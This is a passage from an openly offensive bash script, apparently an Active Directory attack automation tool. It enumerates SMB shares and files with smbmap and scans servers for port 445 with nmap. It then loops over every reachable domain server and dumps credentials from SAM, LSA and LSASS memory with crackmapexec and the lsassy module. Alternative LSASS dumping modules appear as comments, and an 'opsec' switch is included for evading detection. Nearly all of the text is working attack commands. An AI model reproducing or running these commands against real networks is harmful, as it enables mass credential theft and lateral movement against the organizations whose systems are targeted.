    echo -e "${BLUE}[*] SMB shares enum${NC}"
    if [ ! -f "${smbmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of smbmap${NC}"
    else
        echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
            if [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
            else
                ${smbmap} -H $i ${argument_smbmap} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
            fi
        done

        grep -iaH READ ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Scans/all_network_shares_${dc_domain}.csv
        grep -iaH READ ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Scans/all_network_shares_${dc_domain}.txt

        echo -e "${BLUE}[*] Listing files in accessible shares - Step 2/2${NC}"
        for i in $(/bin/cat ${servers_smb_list}); do
            echo -e "${CYAN}[*] Listing files in accessible shares on ${i} ${NC}"
            if [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
            else
                ${smbmap} -H $i ${argument_smbmap} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
            fi
        done
    fi
    echo -e ""
}

pwd_dump () {
    mkdir -p ${output_dir}/Credentials
    mkdir -p ${output_dir}/Scans
    echo -e "${BLUE}[*] nmap scan on port 445 ${NC}"
    if [ ! -f "${nmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
    else
        if [ -z "${servers_list}" ] ; then
            echo -e "${YELLOW}[i] Servers list not provided, dumping passwords on all domain servers ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
            if [ ! -f "${servers_smb_list}" ]; then
                ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        else
            servers_ip_list="${servers_list}"
            servers_smb_list="${output_dir}/Scans/servers_custom_list_smb_${dc_domain}.txt"
            ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
        fi
    fi
    echo -e ""
    
    if [ "${opsec_bool}" == false ] ; then
        echo -e "${BLUE}[*] Dump creds from SAM, LSA and LSASS memory ${NC}"
    else
        echo -e "${BLUE}[*] Dump creds from SAM and LSA ${NC}"
    fi
    
    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please verify the installation of crackmapexec${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] Creds dump requires credentials${NC}"
        else
            for i in $(/bin/cat ${servers_smb_list}); do
                echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
                ${crackmapexec} smb ${i} ${argument_cme} --lsa | tee ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
                ${crackmapexec} smb ${i} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
                if [ "${opsec_bool}" == false ] ; then
                    echo -e "${CYAN}[*] LSASS dump of ${i} ${NC}"
                    ${crackmapexec} smb ${i} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
                    #${crackmapexec} smb ${i} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
                    #${crackmapexec} smb ${i} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
                    #${crackmapexec} smb ${i} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt
                fi
            done
        fi
    fi
}

main